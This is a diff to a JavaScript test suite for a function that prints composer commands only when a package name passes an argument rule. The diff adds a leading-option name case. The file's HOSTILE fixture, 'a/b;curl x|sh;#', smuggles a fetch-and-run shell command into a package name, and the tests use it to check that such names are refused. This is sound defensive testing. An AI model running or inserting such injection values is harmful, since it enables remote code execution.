@@ -116,6 +116,7 @@ describe("answerText", () => {
   describe("prints a command only for a name that passes the argument rule (SPEC §5.6)", () => {
     const HOSTILE = "a/b;curl x|sh;#";
     const DASHED = "-a/b";
+    const OPTION = "--no-update";
 
     it.each([
       ["E", "`composer update vendor/pkg` installs "],
@@ -131,10 +132,13 @@ describe("answerText", () => {
     it.each([
       ["E", HOSTILE, "An update of this package installs "],
       ["E", DASHED, "An update of this package installs "],
+      ["E", OPTION, "An update of this package installs "],
       ["partial", HOSTILE, "Meanwhile, an update of this package installs "],
       ["partial", DASHED, "Meanwhile, an update of this package installs "],
+      ["partial", OPTION, "Meanwhile, an update of this package installs "],
       ["unreached", HOSTILE, "`composer why` with this package's name names what requires it"],
       ["unreached", DASHED, "`composer why` with this package's name names what requires it"],
+      ["unreached", OPTION, "`composer why` with this package's name names what requires it"],
     ])("case %s words the command of %s", (id, name, phrase) => {
       const { finding, report } = recorded(id);
       finding.package = name;
